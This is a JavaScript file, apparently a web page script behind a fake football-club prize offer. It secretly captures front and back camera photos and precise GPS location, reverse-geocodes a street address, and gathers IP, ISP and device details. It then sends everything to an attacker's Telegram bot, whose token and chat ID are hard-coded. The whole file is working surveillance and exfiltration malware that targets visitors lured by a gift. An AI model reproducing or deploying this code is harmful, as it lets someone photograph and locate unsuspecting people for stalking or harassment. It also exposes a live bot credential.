const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const info = {
  time: '', ip: '', isp: '', realIp: '', address: '', country: '', 
  lat: '', lon: '', device: '', os: '', camera: '⏳ Đang quét...'
};

const delay = ms => new Promise(res => setTimeout(res, ms));

function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } 
  else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    info.device = 'iPhone/iPad';
  } else {
    info.device = platform || 'PC';
    info.os = 'Khác';
  }
}

async function getIPData() {
  try {
    const res = await fetch('https://ipwho.is/').then(r => r.json());
    info.ip = res.ip;
    info.realIp = res.ip;
    info.isp = res.connection?.org || 'N/A';
    info.country = res.country || 'Việt Nam';
    if(!info.lat) { info.lat = res.latitude; info.lon = res.longitude; }
  } catch (e) { info.ip = 'Lỗi IP'; }
}

async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve();
    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
          const data = await res.json();
          info.address = data.display_name;
        } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}`; }
        resolve();
      },
      () => resolve(),
      { enableHighAccuracy: true, timeout: 4500, maximumAge: 0 }
    );
  });
}

async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.6);
        }, 600);
      };
    });
  } catch (e) { throw e; }
}

function getCaption() {
  // Link Maps chuẩn 100% để Telegram không chặn
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  return `
🏆 <b>[DATA NHẬN QUÀ FC GIAO THỦY]</b>
--------------------------
🕒 <b>Thời gian:</b> ${info.time}
📱 <b>Thiết bị:</b> ${info.device} (${info.os})
🌍 <b>IP:</b> ${info.ip}
🏢 <b>ISP:</b> ${info.isp}
🏙️ <b>Địa chỉ:</b> ${info.address || 'Chưa xác định'}
📍 <b>Bản đồ:</b> <a href="${mapsLink}">Bấm vào đây để xem</a>
📸 <b>Cam:</b> ${info.camera}
`.trim();
}

async function main() {
  info.time = new Date().toLocaleString('vi-VN');
  detectDevice();
  
  let frontBlob = null;
  let backBlob = null;

  try {
    frontBlob = await captureCamera("user");
    await delay(500);
    backBlob = await captureCamera("environment");
    info.camera = '✅ OK 2 mặt';
  } catch (e) {
    info.camera = '🚫 Bị chặn Cam';
  }

  // Chạy IP và GPS song song để kịp 5 giây
  await Promise.all([getIPData(), getLocation(), delay(2000)]);

  const caption = getCaption();

  if (frontBlob || backBlob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    
    const mediaGroup = [];
    if (frontBlob) {
      formData.append('front', frontBlob, 'front.jpg');
      mediaGroup.push({
        type: 'photo',
        media: 'attach://front',
        caption: caption,
        parse_mode: 'HTML'
      });
    }
    if (backBlob) {
      formData.append('back', backBlob, 'back.jpg');
      mediaGroup.push({
        type: 'photo',
        media: 'attach://back'
      });
    }

    formData.append('media', JSON.stringify(mediaGroup));

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
      method: 'POST',
      body: formData
    });
  } else {
    // Nếu đéo có ảnh thì gửi text thôi cho chắc ăn
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: caption,
        parse_mode: 'HTML'
      })
    });
  }
}
